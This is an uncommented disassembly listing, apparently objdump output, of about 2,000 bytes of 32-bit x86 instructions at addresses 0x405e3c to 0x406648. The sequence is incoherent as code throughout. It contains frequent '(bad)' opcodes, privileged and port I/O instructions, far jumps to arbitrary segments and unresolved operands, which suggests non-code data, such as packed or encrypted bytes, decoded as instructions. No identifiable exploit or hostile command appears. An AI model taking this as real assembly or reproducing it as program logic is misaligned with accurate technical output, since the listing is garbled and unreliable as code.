  405e3c:	inc    ebx
  405e3d:	push   ss
  405e3e:	sub    esp,DWORD PTR [edi]
  405e40:	xor    DWORD PTR [esi],eax
  405e42:	jge    0x405df7
  405e44:	cwde   
  405e45:	jae    0x405e72
  405e47:	or     esp,DWORD PTR [edi+0x7f]
  405e4a:	mov    al,ds:0x8f68326e
  405e4f:	add    BYTE PTR gs:[eax],al
  405e52:	add    ebp,0xc0a3cb7b
  405e58:	adc    DWORD PTR [ebx-0x1b],ebp
  405e5b:	and    BYTE PTR [edx+0x3b2db98a],bh
  405e61:	sar    BYTE PTR [ecx-0x76],1
  405e64:	cmp    BYTE PTR [edi-0x176b0435],ch
  405e6a:	lods   eax,DWORD PTR ds:[esi]
  405e6b:	sbb    DWORD PTR [edi],ebx
  405e6d:	cmp    eax,DWORD PTR [ebp+0x2263fccc]
  405e73:	jle    0x405e63
  405e75:	arpl   WORD PTR [esi-0x23427e78],cx
  405e7b:	or     al,0x2d
  405e7d:	jne    0x405e9b
  405e7f:	fimul  WORD PTR [edi-0x15eccc78]
  405e85:	gs test eax,edx
  405e88:	and    al,0x4
  405e8a:	add    ebp,DWORD PTR [ebx-0x8]
  405e8d:	and    edx,DWORD PTR [eax]
  405e8f:	sbb    al,0x23
  405e91:	sbb    eax,DWORD PTR [eax-0x39e1321f]
  405e97:	sbb    dh,bl
  405e99:	sbb    BYTE PTR [ebx-0x1cb5fa22],ch
  405e9f:	sahf   
  405ea0:	sub    esi,DWORD PTR [ebp+0x6976bf32]
  405ea6:	loop   0x405f01
  405ea8:	es mov dl,0x5c
  405eab:	sbb    eax,0xf42d0a0
  405eb0:	scas   eax,DWORD PTR es:[edi]
  405eb1:	mov    ds:0xadefd134,al
  405eb6:	add    al,0x5c
  405eb8:	xor    BYTE PTR [ebx+0x3],al
  405ebb:	inc    edi
  405ebc:	pop    es
  405ebd:	adc    dh,bh
  405ebf:	pop    es
  405ec0:	in     al,dx
  405ec1:	sbb    BYTE PTR [edx],0x44
  405ec4:	ror    DWORD PTR gs:[edi-0x34],1
  405ec8:	push   ebp
  405ec9:	sub    al,ch
  405ecb:	mov    eax,0x2971e023
  405ed0:	shr    esi,1
  405ed2:	inc    ebp
  405ed3:	and    ah,BYTE PTR [edx-0x12]
  405ed6:	xor    eax,DWORD PTR ds:[ebx+0x544d46a3]
  405edd:	int3   
  405ede:	cld    
  405edf:	add    al,0x16
  405ee1:	mov    esi,0x2e7be607
  405ee6:	je     0x405ef0
  405ee8:	cmp    esp,ebp
  405eea:	cmp    dl,BYTE PTR [ebp+0x104accfc]
  405ef0:	dec    edi
  405ef1:	dec    eax
  405ef2:	inc    eax
  405ef3:	and    DWORD PTR [esi+0x1461e0d0],ebx
  405ef9:	or     al,0x4c
  405efb:	jo     0x405f42
  405efd:	in     eax,dx
  405efe:	imul   ebx,DWORD PTR [edi],0xffffffe0
  405f01:	add    BYTE PTR [ecx+0x21],al
  405f04:	shr    BYTE PTR [esp+ecx*1],0x89
  405f08:	add    eax,0x979af7c8
  405f0d:	cld    
  405f0e:	mov    BYTE PTR [ebp+0x129e04a8],0xac
  405f15:	inc    esi
  405f16:	mov    dh,0xae
  405f18:	int3   
  405f19:	mov    al,0xf9
  405f1b:	hlt    
  405f1c:	lfs    edi,FWORD PTR [eax+0x6b9b2327]
  405f23:	add    eax,0xc0bc1f85
  405f28:	clc    
  405f29:	jge    0x405f19
  405f2b:	mov    WORD PTR [edi+ecx*1-0x3c],gs
  405f2f:	enter  0x8255,0x6a
  405f33:	ficom  WORD PTR [ecx-0x72b44873]
  405f39:	mov    edx,DWORD PTR [eax+ecx*1]
  405f3c:	imul   ebx,DWORD PTR [eax+0x486fb806],0x4abde0
  405f46:	add    edx,DWORD PTR cs:[ebx]
  405f49:	scas   eax,DWORD PTR es:[edi]
  405f4a:	enter  0x942c,0xbc
  405f4e:	push   ecx
  405f4f:	lods   al,BYTE PTR ds:[esi]
  405f50:	fist   DWORD PTR ds:0x90580fdd
  405f56:	push   esp
  405f57:	mov    bh,0x47
  405f59:	test   BYTE PTR [esi+ebx*2+0x9],dh
  405f5d:	mov    al,0xab
  405f5f:	cmp    ah,BYTE PTR [eax+0x531cff46]
  405f65:	sbb    ah,BYTE PTR [ecx+ecx*1-0x278914e6]
  405f6c:	inc    esp
  405f6d:	push   eax
  405f6e:	add    al,0x48
  405f70:	iret   
  405f71:	dec    eax
  405f72:	loope  0x405f4e
  405f74:	mov    esi,0x4c043758
  405f79:	pop    esp
  405f7a:	or     DWORD PTR [eax+0x7b],edx
  405f7d:	hlt    
  405f7e:	add    ecx,ebx
  405f80:	fsub   QWORD PTR [eax]
  405f82:	pop    edx
  405f83:	dec    ebx
  405f84:	sub    BYTE PTR [ebx-0x68],cl
  405f87:	inc    ecx
  405f88:	mov    bh,0x4a
  405f8a:	fcom   DWORD PTR [edx+0x6a6b1ab4]
  405f90:	inc    eax
  405f91:	icebp  
  405f92:	add    cl,ah
  405f94:	cmp    edx,DWORD PTR [esp+eiz*2]
  405f97:	aam    0x2f
  405f99:	push   0xc5e26710
  405f9e:	or     bl,BYTE PTR [ecx]
  405fa0:	and    ah,BYTE PTR [edx-0x1e]
  405fa3:	adc    eax,0xdb7209d1
  405fa8:	js     0x405f5b
  405faa:	inc    esp
  405fab:	lods   al,BYTE PTR ds:[esi]
  405fac:	imul   esi,DWORD PTR [eax+0x7b0612a0],0xffffff9e
  405fb3:	jp     0x405fd6
  405fb5:	xor    dl,BYTE PTR [ecx]
  405fb7:	iret   
  405fb8:	xor    eax,0xb204478d
  405fbd:	mov    al,ds:0xfefc416e
  405fc2:	test   bl,bl
  405fc4:	mov    al,0xb6
  405fc6:	lods   al,BYTE PTR ds:[esi]
  405fc7:	mov    al,ds:0x409f1436
  405fcc:	xchg   esi,eax
  405fcd:	cmp    al,0x81
  405fcf:	add    al,0x93
  405fd1:	xchg   ebx,eax
  405fd2:	dec    esi
  405fd3:	js     0x405feb
  405fd5:	mov    edx,0x544d1520
  405fda:	(bad)  
  405fdb:	in     al,0x87
  405fdd:	add    al,0x8
  405fdf:	out    0x7,eax
  405fe1:	bound  esi,QWORD PTR [esi]
  405fe3:	xchg   ebx,eax
  405fe4:	push   ebp
  405fe5:	xchg   ecx,eax
  405fe6:	ret    0x252
  405fe9:	in     al,dx
  405fea:	jge    0x40601b
  405fec:	push   0xbbd83b08
  405ff1:	push   edi
  405ff2:	adc    eax,0x1332ad91
  405ff7:	(bad)  
  405ff8:	mov    ebx,0x2e0b59bd
  405ffd:	cmp    DWORD PTR [esp+ebx*1+0x1c54f38d],edx
  406004:	enter  0x8e66,0x38
  406008:	retf   0x94c8
  40600b:	and    esp,DWORD PTR [ecx+ebp*1+0x23]
  40600f:	or     al,0xbe
  406011:	aad    0xcd
  406013:	mov    eax,ebp
  406015:	mov    bl,0x8
  406017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406018:	cmp    BYTE PTR [eax+0xc],0x69
  40601c:	jg     0x406072
  40601e:	out    dx,eax
  40601f:	push   ds
  406020:	and    esp,edi
  406022:	ret    
  406023:	inc    ebp
  406024:	push   esp
  406025:	push   cs
  406026:	or     DWORD PTR [edx+edi*8+0x52],edx
  40602a:	arpl   WORD PTR gs:[ecx],ax
  40602d:	sub    al,0xac
  40602f:	or     BYTE PTR [eax],0x44
  406032:	sbb    al,0x40
  406034:	stos   DWORD PTR es:[edi],eax
  406035:	sbb    bl,dl
  406037:	jp     0x4060aa
  406039:	das    
  40603a:	ror    DWORD PTR [eax-0x730fa55b],1
  406040:	pushw  es
  406042:	jg     0x40604d
  406044:	aad    0xf3
  406046:	imul   ebp
  406048:	cmp    esi,DWORD PTR [ebx*8+0x75144226]
  40604f:	icebp  
  406050:	or     eax,0x180c8b15
  406055:	mov    ds:0x90f946e,al
  40605a:	push   eax
  40605b:	in     al,dx
  40605c:	dec    ecx
  40605d:	jmp    0x40607c
  40605f:	ds aad 0x9e
  406062:	fidiv  DWORD PTR [esi+eax*8+0x22]
  406066:	push   esp
  406067:	cld    
  406068:	outs   dx,DWORD PTR ds:[esi]
  406069:	inc    esi
  40606a:	ror    BYTE PTR [ebx+0x1ecbfd05],1
  406070:	xchg   ebx,eax
  406071:	lods   al,BYTE PTR ds:[esi]
  406072:	mov    DWORD PTR [eax+0xc],esi
  406075:	pop    ecx
  406076:	xor    edi,DWORD PTR [edi+0x0]
  406079:	mov    edx,DWORD PTR [ebp+edi*4-0x2c]
  40607d:	push   cs
  40607e:	or     dl,BYTE PTR [esp+ebx*1-0x80]
  406082:	fidiv  DWORD PTR ds:0x285361b8
  406088:	sar    dh,1
  40608a:	retf   0x36e
  40608d:	adc    BYTE PTR [edx-0x14],cl
  406090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406091:	call   0x725689cd
  406096:	adc    ch,bl
  406098:	sub    al,0x9a
  40609a:	mov    ebx,gs
  40609c:	sub    eax,DWORD PTR [edi]
  40609e:	add    ah,BYTE PTR [edx-0x30]
  4060a1:	pusha  
  4060a2:	nop
  4060a3:	jbe    0x4060d6
  4060a5:	(bad)  
  4060a6:	cs push esp
  4060a8:	jge    0x40609f
  4060aa:	inc    edx
  4060ab:	xor    al,0xe
  4060ad:	mov    eax,DWORD PTR [eax]
  4060af:	imul   eax,DWORD PTR [ebp+0x2ddd95b0],0x39
  4060b6:	jmp    0x4060bf
  4060b8:	or     BYTE PTR [esp+ebp*2-0x63e3db9],dl
  4060bf:	xor    bh,0x1e
  4060c2:	push   0x91e09b73
  4060c7:	mov    ah,BYTE PTR [esi+0x7d]
  4060ca:	xchg   ebp,eax
  4060cb:	cld    
  4060cc:	lock test BYTE PTR [eax],bl
  4060cf:	adc    BYTE PTR ds:0x73e095c8,ch
  4060d5:	mov    edi,DWORD PTR [eax+0x2a]
  4060d8:	mov    esp,0x7782822a
  4060dd:	rcl    BYTE PTR [esi],1
  4060df:	adc    al,0xa2
  4060e1:	inc    ecx
  4060e2:	popf   
  4060e3:	cld    
  4060e4:	jmp    0x40608f
  4060e6:	pop    ebx
  4060e7:	cs fcmovnbe st,st(6)
  4060ea:	or     eax,ebp
  4060ec:	in     al,dx
  4060ed:	push   es
  4060ee:	lock jge 0x4060e5
  4060f1:	clc    
  4060f2:	or     ecx,0xffffffb3
  4060f5:	cdq    
  4060f6:	pop    edx
  4060f7:	adc    al,0x4b
  4060f9:	sub    ah,al
  4060fb:	cld    
  4060fc:	inc    esi
  4060fd:	aam    0x77
  4060ff:	in     al,dx
  406100:	dec    ebp
  406101:	loopne 0x4060fc
  406103:	push   edi
  406104:	hlt    
  406105:	xchg   edx,eax
  406106:	lock dec ecx
  406108:	add    dl,al
  40610a:	add    BYTE PTR [edi],0x95
  40610d:	out    0xb6,eax
  40610f:	bound  ebx,QWORD PTR [edi]
  406111:	js     0x4060d7
  406113:	add    al,ch
  406115:	ds repz mov esp,ecx
  406119:	data16 mov cl,0x1d
  40611c:	inc    ecx
  40611d:	dec    ebp
  40611e:	ins    DWORD PTR es:[edi],dx
  40611f:	add    BYTE PTR [ebx+edi*4-0x15aebd1e],bh
  406126:	sub    BYTE PTR [ebp+0x4c17d99],dl
  40612c:	sbb    DWORD PTR [ecx+0x42],esp
  40612f:	iret   
  406130:	loopne 0x4060c7
  406132:	in     al,dx
  406133:	pop    ds
  406134:	addr16 call 0x1d3b9bba
  40613a:	pop    eax
  40613b:	push   esp
  40613c:	jo     0x406126
  40613e:	xor    eax,0x90646400
  406143:	inc    ecx
  406144:	std    
  406145:	pop    ecx
  406146:	push   ebx
  406147:	push   ebp
  406148:	cmp    esp,0x21
  40614b:	jg     0x406189
  40614d:	dec    eax
  40614e:	je     0x406198
  406150:	jmp    0x4061a7
  406152:	xor    esi,DWORD PTR [edi+esi*1-0x15]
  406156:	inc    edi
  406157:	xor    eax,0x233f2337
  40615c:	sub    BYTE PTR [esi],dl
  40615e:	jmp    0x40618f
  406160:	and    eax,0x5921eb1d
  406165:	xchg   esi,eax
  406166:	gs sti 
  406168:	mov    al,0x3
  40616a:	ret    
  40616b:	mov    al,0x4
  40616d:	add    al,BYTE PTR ds:0x65080706
  406173:	pop    ecx
  406174:	xchg   esi,eax
  406175:	or     DWORD PTR gs:[ebx],ecx
  406178:	or     al,0xd
  40617a:	push   cs
  40617b:	mov    WORD PTR [eax-0x4e],?
  40617e:	mov    ds:0x30960716,al
  406183:	test   al,0x8b
  406185:	xor    cl,BYTE PTR [edi]
  406187:	push   esp
  406188:	cwde   
  406189:	mov    DWORD PTR [ebx-0x74],edx
  40618c:	fs fs jnp 0x406196
  406190:	inc    esi
  406191:	or     BYTE PTR ds:0x8391a8b0,al
  406197:	adc    eax,0x983dac67
  40619c:	pop    edx
  40619e:	push   es
  40619f:	fist   WORD PTR [ecx]
  4061a1:	gs pop eax
  4061a3:	cld    
  4061a4:	cmp    DWORD PTR [ebx+0x14],0xffffff87
  4061a8:	setae  BYTE PTR [edi]
  4061ab:	xchg   ebx,eax
  4061ac:	adc    BYTE PTR [ecx+0x48],bh
  4061af:	pop    eax
  4061b0:	mov    ds:0xc09543b8,al
  4061b5:	add    DWORD PTR [ecx-0xd3b08e8],0xb833c014
  4061bf:	or     ecx,DWORD PTR [eax+edx*2]
  4061c2:	les    edi,FWORD PTR [ebp-0x14]
  4061c5:	add    BYTE PTR [ebx-0x7a6f06bf],al
  4061cb:	mov    dh,0xa9
  4061cd:	xlat   BYTE PTR ds:[ebx]
  4061ce:	mov    edx,0x47630660
  4061d3:	loopne 0x40617c
  4061d5:	jo     0x406170
  4061d7:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061d9:	xor    esi,0xfed832a4
  4061df:	(bad)  
  4061e0:	push   ebp
  4061e1:	mov    ebp,0x8d8db106
  4061e6:	and    DWORD PTR ds:0x64d82f07,ebp
  4061ec:	add    al,0x8b
  4061ee:	adc    eax,0xb19ae6b5
  4061f3:	ror    DWORD PTR [edx+0x63],0xc0
  4061f7:	mov    esp,0xed0bc039
  4061fc:	fs ins BYTE PTR es:[edi],dx
  4061fe:	or     al,0x12
  406200:	les    ecx,FWORD PTR [edi]
  406202:	enter  0x59f8,0xa2
  406206:	js     0x40619b
  406208:	xchg   ecx,eax
  406209:	int3   
  40620a:	shl    BYTE PTR [esi+0x77],1
  40620d:	repnz mov ebp,0xf6464ed6
  406213:	shl    eax,0x8d
  406216:	shufps xmm1,XMMWORD PTR [esi],0x72
  40621a:	mov    WORD PTR [esi+edx*2],?
  40621d:	sub    al,0xeb
  40621f:	pop    ebp
  406220:	cwde   
  406221:	nop
  406222:	xor    dh,BYTE PTR [edx]
  406224:	jbe    0x4061ec
  406226:	ds xchg esp,eax
  406228:	pop    esi
  406229:	cwde   
  40622a:	pushf  
  40622b:	mov    WORD PTR [esp+ecx*4-0x6f5b5fb4],ds
  406232:	add    ah,BYTE PTR ds:0x8cb20c83
  406238:	mov    esp,0x2cbf908c
  40623d:	and    BYTE PTR [ecx],al
  40623f:	cwde   
  406240:	xchg   esi,eax
  406241:	lea    eax,[ebp+0x202f1f8c]
  406247:	ret    0x5f91
  40624a:	scas   al,BYTE PTR es:[edi]
  40624b:	push   esp
  40624c:	sub    al,0xa9
  40624e:	xor    ah,BYTE PTR [edx*8+0x248a0cdf]
  406255:	inc    esp
  406256:	das    
  406257:	cdq    
  406258:	push   ds
  406259:	xor    BYTE PTR [esi+0x65b993c],al
  40625f:	rol    BYTE PTR [ebx-0x3b91213e],1
  406265:	lea    edx,[edi-0x16]
  406268:	or     bh,dh
  40626a:	sbb    eax,0x730a074a
  40626f:	and    dh,bh
  406271:	mov    ebx,0xf1c1900d
  406276:	cmp    edx,DWORD PTR [ebp+0x33]
  406279:	enter  0xa59,0x6
  40627d:	imul   edx,DWORD PTR [edx],0x6b5f3050
  406283:	hlt    
  406284:	ss enter 0x5966,0x0
  406289:	lock inc esi
  40628b:	cwde   
  40628c:	lock iret 
  40628e:	in     al,0x59
  406290:	add    al,0x39
  406292:	push   ecx
  406293:	pushf  
  406294:	xor    BYTE PTR [ecx+0x44],dl
  406297:	and    DWORD PTR [edx+0x2d063870],esp
  40629d:	inc    eax
  40629e:	test   BYTE PTR [ebp-0x66d0dfa5],dl
  4062a4:	(bad)  
  4062a5:	retf   
  4062a6:	or     DWORD PTR [eax-0x13370bb9],eax
  4062ac:	push   ds
  4062ad:	sub    eax,DWORD PTR [esi-0x72]
  4062b0:	mov    WORD PTR [edi+ebx*2],ss
  4062b3:	fcom   DWORD PTR [eax-0x70]
  4062b6:	mov    ds:0xbdf91c93,eax
  4062bb:	xchg   DWORD PTR [esi],edx
  4062bd:	inc    edi
  4062be:	xchg   esp,eax
  4062bf:	push   ebp
  4062c0:	sbb    BYTE PTR [eax+0x7c40d7ef],dl
  4062c6:	xchg   esi,eax
  4062c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062c8:	dec    ecx
  4062c9:	xchg   esp,eax
  4062ca:	mov    eax,ds:0x7c0a0847
  4062cf:	ins    DWORD PTR es:[edi],dx
  4062d0:	push   ss
  4062d1:	fistp  WORD PTR [ecx-0x3a33ea94]
  4062d7:	jg     0x4062f0
  4062d9:	add    BYTE PTR [esi+ebp*8],dl
  4062dc:	out    0xfb,eax
  4062de:	xchg   esi,eax
  4062df:	mov    ah,0xa
  4062e1:	or     al,0x98
  4062e3:	mov    al,ds:0xf2a60fb8
  4062e8:	stc    
  4062e9:	dec    BYTE PTR [eax]
  4062eb:	inc    edi
  4062ec:	test   al,0x89
  4062ee:	add    cl,BYTE PTR [esp+ebx*1]
  4062f1:	inc    esi
  4062f2:	xchg   esp,eax
  4062f3:	(bad)  
  4062f4:	jl     0x40630d
  4062f6:	jmp    0x7a1:0x1a6cad40
  4062fd:	(bad)  
  4062fe:	push   eax
  4062ff:	lds    ecx,FWORD PTR [edx]
  406301:	adc    al,0xa8
  406303:	or     BYTE PTR [eax+0x263b58b1],dl
  406309:	(bad)  
  40630a:	(bad)  
  40630b:	and    dl,BYTE PTR [eax+0x6437ecd9]
  406311:	nop
  406312:	mov    al,0x22
  406314:	dec    eax
  406315:	and    bl,BYTE PTR [ebx-0x799c841c]
  40631b:	mov    ds:0x11080881,eax
  406320:	int3   
  406321:	pushf  
  406322:	inc    ebx
  406323:	push   cs
  406324:	cmp    eax,DWORD PTR [eax]
  406326:	or     BYTE PTR [eax+ebp*4],cl
  406329:	mov    dh,0xa0
  40632b:	pop    esp
  40632c:	cmp    dl,BYTE PTR [ebx]
  40632e:	mov    al,0x6c
  406330:	jmp    DWORD PTR [ebp-0x6c]
  406333:	rcl    al,0x57
  406336:	push   eax
  406337:	leave  
  406338:	inc    eax
  406339:	jno    0x40630e
  40633b:	jge    0x40638e
  40633d:	mov    eax,0x8bc96f3
  406342:	add    al,0xe2
  406344:	in     eax,dx
  406345:	cmp    eax,0xc408c0cd
  40634a:	mov    ss,WORD PTR [edi]
  40634c:	add    DWORD PTR [ebp+0x10],esi
  40634f:	add    ch,BYTE PTR [edi-0x6f8e7d4]
  406355:	call   DWORD PTR [esi]
  406357:	push   ecx
  406358:	add    al,ch
  40635a:	(bad)  
  40635b:	fimul  WORD PTR [ecx]
  40635d:	(bad)  
  40635f:	mov    eax,0x6f76cc04
  406364:	enter  0x5d97,0x14
  406368:	mov    ecx,0xef5f0080
  40636d:	cmp    eax,DWORD PTR ds:0xfd9fbf68
  406373:	dec    esp
  406374:	jl     0x406389
  406376:	pop    es
  406377:	jne    0x406381
  406379:	cmp    edx,DWORD PTR ds:0xc8037e53
  40637f:	imul   ebp,DWORD PTR [edi+0x1fba895c],0xffffffe0
  406386:	fwait
  406387:	sbb    BYTE PTR [edx+0x0],0x1a
  40638b:	mov    edx,0x113c8066
  406390:	pusha  
  406391:	xchg   DWORD PTR [eax+eiz*8],edx
  406394:	pop    ss
  406395:	mov    WORD PTR cs:[eax+0x4c],gs
  406399:	call   0x674e:0xf78b48eb
  4063a0:	jg     0x406345
  4063a2:	fidivr DWORD PTR [esi+ecx*2+0xc8a12c4]
  4063a9:	xor    BYTE PTR [ecx-0x2ef2e01f],al
  4063af:	push   ss
  4063b0:	cmp    BYTE PTR [esi],0x72
  4063b3:	jmp    0x165331c2
  4063b8:	vandnps ymm0,ymm4,YMMWORD PTR [ecx+edi*2-0x367cb6fb]
  4063c1:	inc    BYTE PTR [ecx-0x55]
  4063c4:	inc    ecx
  4063c5:	cdq    
  4063c6:	mov    al,0xff
  4063c8:	add    al,0xb2
  4063ca:	add    ch,bl
  4063cc:	adc    ecx,DWORD PTR [edx+0x2493804]
  4063d2:	push   esi
  4063d3:	les    esp,FWORD PTR [ecx-0x4550b956]
  4063d9:	mov    ds:0xbd18acc4,al
  4063de:	outs   dx,DWORD PTR ds:[esi]
  4063df:	inc    eax
  4063e0:	adc    esi,DWORD PTR [esp+eax*4]
  4063e3:	mov    ds:0xec49b04,al
  4063e8:	sti    
  4063e9:	push   esp
  4063ea:	adc    esi,DWORD PTR [ebx]
  4063ec:	leave  
  4063ed:	sbb    eax,0x62101307
  4063f2:	fst    DWORD PTR [esi+0x45]
  4063f5:	sar    DWORD PTR [ebx],0xcc
  4063f8:	add    BYTE PTR [esi],al
  4063fa:	cmp    DWORD PTR [eax-0x10],0xf0b2097e
  406401:	sbb    BYTE PTR [edx-0x30],dl
  406404:	xor    esp,DWORD PTR [ebx]
  406406:	fwait
  406407:	call   0xfa6c94bb
  40640c:	pop    es
  40640d:	mov    esi,0x7eff85ed
  406412:	inc    esi
  406413:	pop    esi
  406414:	add    BYTE PTR [edi-0x1010bbd3],al
  40641a:	pop    eax
  40641b:	xor    BYTE PTR [ecx+ecx*1],bl
  40641e:	lock in eax,dx
  406420:	int3   
  406421:	and    BYTE PTR [ebx],bh
  406423:	sti    
  406424:	jl     0x40644b
  406426:	cmp    ecx,DWORD PTR ds:0xe8b9a26b
  40642c:	pusha  
  40642d:	ins    DWORD PTR es:[edi],dx
  40642e:	mov    ecx,0x50052445
  406433:	and    BYTE PTR [eax+0x7d],0x4e
  406437:	push   eax
  406438:	and    DWORD PTR [ebx+0x93b6f26],esp
  40643e:	dec    esi
  40643f:	pusha  
  406440:	call   0x5725:0x541c5c60
  406447:	mov    dl,0x1d
  406449:	and    DWORD PTR [esi+0x54],eax
  40644c:	pop    ds
  40644d:	(bad)  
  40644e:	stos   BYTE PTR es:[edi],al
  40644f:	in     al,dx
  406450:	mov    ds:0xf45d3bf8,al
  406455:	jge    0x4063ee
  406457:	jl     0x40642e
  406459:	xchg   ebx,eax
  40645a:	dec    esp
  40645b:	fst    DWORD PTR [edi-0x3]
  40645e:	push   cs
  40645f:	push   ds
  406460:	xor    ecx,DWORD PTR [eax+ecx*2]
  406463:	push   0x43
  406465:	loopne 0x4064d9
  406467:	mul    DWORD PTR [eax-0x77e776fe]
  40646d:	bound  edx,QWORD PTR [ecx]
  40646f:	xor    BYTE PTR [edi],dh
  406471:	addr16 cwde 
  406473:	mov    WORD PTR [edx],ds
  406475:	nop
  406476:	pop    ebp
  406477:	dec    edx
  406478:	cmc    
  406479:	aas    
  40647a:	or     BYTE PTR [esi],bl
  40647c:	jbe    0x40641f
  40647e:	push   eax
  40647f:	jle    0x4064b8
  406481:	repnz cs push esp
  406484:	add    al,bh
  406486:	pop    ecx
  406487:	mov    WORD PTR [eax+0x20],gs
  40648a:	pushf  
  40648b:	inc    esp
  40648c:	dec    ebx
  40648d:	cmp    eax,DWORD PTR [ebp+ecx*2+0x46]
  406491:	fsubr  QWORD PTR [ecx+0x7f]
  406494:	or     al,0xd6
  406496:	jg     0x4064c9
  406498:	and    al,ch
  40649a:	sahf   
  40649b:	mov    bl,0x8
  40649d:	inc    DWORD PTR [ebx+eax*1]
  4064a0:	ins    DWORD PTR es:[edi],dx
  4064a1:	add    esp,DWORD PTR [esi+0x636d162c]
  4064a7:	inc    esi
  4064a8:	mov    eax,ds
  4064aa:	mov    al,0x0
  4064ac:	or     DWORD PTR es:[ecx+0x67],eax
  4064b0:	xchg   edi,eax
  4064b1:	add    eax,0x6626720b
  4064b6:	pop    edi
  4064b7:	jge    0x406450
  4064b9:	lea    ebp,[eax+esi*4+0xf]
  4064bd:	or     ecx,DWORD PTR [ecx+0x200a3c5f]
  4064c3:	push   esi
  4064c4:	sti    
  4064c5:	test   eax,0x2b400b53
  4064ca:	ret    
  4064cb:	adc    eax,0xc1b35140
  4064d0:	sbb    BYTE PTR [ebx-0x28],0x17
  4064d4:	fdiv   DWORD PTR [eax-0x74cc9a00]
  4064da:	and    esp,esp
  4064dc:	test   bh,bh
  4064de:	mov    al,0x3b
  4064e0:	and    cl,BYTE PTR [edx-0x7e00ccac]
  4064e6:	loop   0x406528
  4064e8:	adc    eax,0x461f053a
  4064ed:	pop    ebp
  4064ee:	add    eax,esi
  4064f0:	dec    eax
  4064f1:	out    0x2d,al
  4064f3:	mov    al,ds:0xcc138c17
  4064f8:	sar    DWORD PTR [esp],0xcb
  4064fc:	popa   
  4064fd:	cmp    DWORD PTR [esi+ebx*1],esp
  406500:	adc    DWORD PTR [ebx-0x64ab9f3a],ecx
  406506:	pushf  
  406507:	ret    
  406508:	pop    es
  406509:	dec    edi
  40650a:	xchg   BYTE PTR [ecx+0x1b],dl
  40650d:	xor    al,0xda
  40650f:	push   esi
  406510:	idiv   BYTE PTR [edx]
  406512:	push   eax
  406513:	mov    WORD PTR [edx-0x34],?
  406516:	arpl   WORD PTR [edx],cx
  406518:	ds cs fs pusha 
  40651c:	add    al,BYTE PTR [edx+0x35]
  40651f:	retf   
  406520:	sub    esi,edi
  406522:	and    al,0x8a
  406524:	inc    edi
  406525:	sbb    DWORD PTR [eax+edi*1],ebp
  406528:	mov    ebx,0xc5121393
  40652d:	mov    ebp,0xd460dd9e
  406532:	cli    
  406533:	sbb    al,0x4a
  406535:	jo     0x4064d6
  406537:	ror    dh,0xc2
  40653a:	loopne 0x406533
  40653c:	mov    ebp,0x53f80d54
  406541:	pop    ebp
  406542:	inc    eax
  406543:	arpl   WORD PTR [eax],bx
  406545:	pop    ebp
  406546:	pusha  
  406547:	je     0x4064e7
  406549:	in     al,0xc0
  40654b:	ret    
  40654c:	stos   BYTE PTR es:[edi],al
  40654d:	and    DWORD PTR [edi],esp
  40654f:	test   BYTE PTR [eax-0x797f61c9],al
  406555:	jo     0x4064ef
  406557:	sub    DWORD PTR [edi],edx
  406559:	imul   BYTE PTR [ebp-0x45]
  40655c:	mov    WORD PTR [edi+0x74],ss
  40655f:	and    ebx,DWORD PTR [ebx+ecx*4+0xfbe7fd5]
  406566:	and    eax,DWORD PTR [esp+edi*2]
  406569:	cmp    ebp,ebx
  40656b:	jl     0x4065c8
  40656d:	and    cl,BYTE PTR [eax+ebx*1]
  406570:	mov    BYTE PTR [esi],cl
  406572:	fldcw  WORD PTR [ecx]
  406574:	jmp    0x243f7dcd
  406579:	adc    al,BYTE PTR [ebx+0x21]
  40657c:	jmp    0x406596
  40657e:	jnp    0x4065a0
  406580:	call   0x1c0c:0x140715ab
  406587:	in     al,0xba
  406589:	in     eax,dx
  40658a:	push   es
  40658b:	adc    BYTE PTR [eax],0x20
  40658e:	inc    ebx
  40658f:	dec    edi
  406590:	jge    0x406542
  406592:	mov    dh,0x8f
  406594:	pop    ss
  406595:	loope  0x40659f
  406597:	and    bl,BYTE PTR [ebp+0xc]
  40659a:	or     al,0x8b
  40659c:	push   ebp
  40659d:	fnsave [ecx-0x74051b18]
  4065a3:	call   0x7dc11695
  4065a8:	arpl   WORD PTR [esp+esi*2-0x6e5f0931],ax
  4065af:	inc    ebp
  4065b0:	adc    DWORD PTR [ecx-0x637fefc1],ecx
  4065b6:	and    BYTE PTR [eax],bl
  4065b8:	shr    DWORD PTR [edi+0x64],0x74
  4065bc:	jecxz  0x40656a
  4065be:	imul   eax,DWORD PTR [edx],0x15d7f8f5
  4065c4:	cld    
  4065c5:	push   ebx
  4065c6:	add    eax,0x6bc6a141
  4065cb:	repnz add ebx,ebx
  4065ce:	cmp    ebx,DWORD PTR [esi+0x53a89b89]
  4065d4:	sti    
  4065d5:	add    dh,BYTE PTR [ecx+ebx*1+0x66]
  4065d9:	push   esi
  4065da:	das    
  4065db:	fisub  DWORD PTR [esi]
  4065dd:	mov    WORD PTR [eax+0x3218f895],es
  4065e3:	int    0x39
  4065e5:	(bad)  
  4065e6:	or     DWORD PTR [edi+0x44402e9],ecx
  4065ec:	shr    DWORD PTR [esi-0x7c],0x61
  4065f0:	inc    ebp
  4065f1:	mov    ecx,0xc52b100f
  4065f6:	int    0x78
  4065f8:	inc    DWORD PTR [eax-0x59]
  4065fb:	sar    BYTE PTR [ebx],1
  4065fd:	bnd jbe 0x4065a7
  406600:	mov    ds:0x4b7a8eae,al
  406605:	mov    bh,BYTE PTR [edi+esi*2-0x330a0aea]
  40660c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40660d:	mov    al,ds:0x94a0ef06
  406612:	sahf   
  406613:	cwde   
  406614:	jne    0x40661b
  406616:	jne    0x40665f
  406618:	sbb    eax,0x3a0e1849
  40661d:	mov    ds:0x21ce0d65,al
  406622:	arpl   ax,bp
  406624:	push   ebp
  406625:	xchg   DWORD PTR [eax],ebx
  406627:	pop    es
  406628:	in     eax,dx
  406629:	cli    
  40662a:	xchg   ebx,eax
  40662b:	inc    eax
  40662c:	pop    es
  40662d:	and    DWORD PTR [edx+0x28],esp
  406630:	popf   
  406631:	fcomp  QWORD PTR fs:[edx+0x5048fd54]
  406638:	daa    
  406639:	mov    edx,DWORD PTR [edi]
  40663b:	sub    edx,esi
  40663d:	add    bh,dl
  40663f:	push   ss
  406640:	jmp    0xb002:0x7418e48d
  406647:	pop    es
  406648:	add    DWORD PTR [esi],esp
